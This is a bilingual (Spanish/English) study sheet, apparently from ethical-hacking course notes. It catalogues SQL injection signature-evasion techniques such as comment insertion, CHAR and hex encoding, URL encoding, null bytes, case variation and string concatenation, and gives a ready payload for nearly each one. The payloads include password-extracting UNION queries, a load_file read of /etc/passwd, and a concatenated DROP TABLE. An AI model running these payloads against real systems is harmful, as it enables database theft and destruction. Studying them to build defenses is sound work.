**Types of Signature Evasion Techniques**

**▪ In-line Comment:** Oculta las cadenas de entrada insertando comentarios en línea entre las palabras clave de SQL.

**For example,** /* ... */ is used in SQL to delimit multi-row comments

'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/username/**/ LIKE/**/'admin'--

**▪ Char Encoding:** Utiliza la función incorporada CHAR para representar un carácter. 

**For example:**

**▪ Load files in unions (string = "/etc/passwd")**

' union select 1,

(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;

**▪ Inject without quotes (string = "%")**

' or username like char(37);

**▪ Inject without quotes (string = "root")**

' union select * from users where login = char(114,111,111,116);

**▪ String Concatenation:** Concatena texto para formar una palabra clave SQL utilizando instrucciones específicas del motor de base de datos.

For example, “OR 'Simple' = 'Sim'+'ple'.”

**Oracle:** '; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'

**MSSQL:** '; EXEC ('DRO' + 'P T' + 'AB' + 'LE')

Compose an SQL statement by concatenating strings instead of a parameterized query.

 **MySQL:** '; EXECUTE CONCAT('INSE','RT US','ER')

**▪ Obfuscated Code:** Es una declaración SQL que ha sido modificada para que sea difícil de entender.

**▪ Manipulating White Spaces:** Oculta las cadenas de entrada insertando espacios en blanco entre palabras clave de SQL.

“UNION SELECT” signature is different from “UNION          SELECT”

**▪ Hex Encoding:** Usa codificación hexadecimal para representar una cadena de consulta SQL. 

For example, the string 'SELECT' can be represented by the hexadecimal number 0x73656c656374,

**▪ Sophisticated Matches:** Utiliza expresiones alternativas a “OR 1=1”.  

Example “OR 'john'='john';  “OR ‘john’=N’john’; ' OR 'microsoft' = 'micro'+'soft' ; ' OR 'movies' = N'movies' ; ' OR 'software' like 'soft%' ; ' OR 7 > 1

**▪ URL Encoding:** Oculta una cadena de entrada agregando el signo de porcentaje (%) antes de cada punto de código.

**Normal query**

‘ UNION SELECT Password FROM Users_Data WHERE name='Admin'--

**After URL encoding, the above query is represented as,**

%27%20UNION%20SELECT%20Password%20FROM%20Users_Data%20WHERE%20name%3 D%27Admin%27%E2%80%94

**▪ Null Byte:** Utiliza el carácter de byte nulo (%00) antes de una cadena para evadir el mecanismo de detección.

For example, the following SQL query is used by an attacker to extract the password from the database:

' UNION SELECT Password FROM Users WHERE UserName='admin'--

If the server is protected by a WAF or IDS, then the attacker prepends NULL bytes to the above query as follows:

%00' UNION SELECT Password FROM Users WHERE UserName='admin'--

**▪ Case Variation:** Ofusca la instrucción SQL mezclando letras mayúsculas y minúsculas.

For example, consider that the filter is designed to detect the following queries:

union select user_id, password from admin where user_name=’admin’--

UNION SELECT USER_ID, PASSWORD FROM ADMIN WHERE USER_NAME=’ADMIN’--

Then, the attacker can easily bypass the filter using the following query:

UnIoN sEleCt UsEr_iD, PaSSwOrd fROm aDmiN wHeRe UseR_NamE=’AdMIn’--

**▪ Declare Variables:** Usa variables para pasar una serie de instrucciones SQL especialmente diseñadas y evadir el mecanismo de detección

**For example, the SQL injection statement used by an attacker is as follows:**

UNION Select Password

The attacker redefines the above SQL statement in the variable “sqlvar” as follows:

; declare @sqlvar nvarchar(70); set @sqlvar = (N'UNI' + N'ON' + N' SELECT' + N'Password'); EXEC(@sqlvar)

**▪ IP Fragmentation:** Utiliza fragmentos de paquetes para ocultar la carga útil del ataque, lo que permite que pase desapercibida por el mecanismo de firmas.

**▪ Variations:**  Utiliza una instrucción WHERE que siempre se evalúa como “verdadera”, de modo que se puede usar cualquier comparación matemática o de cadena.

For example, the following queries will return identical result sets:

SELECT * FROM accounts WHERE userName = 'Bob' OR 1=1 –-

SELECT * FROM accounts WHERE userName = 'Bob' OR 2=2 –-

SELECT * FROM accounts WHERE userName = 'Bob' OR 1+1=2 –-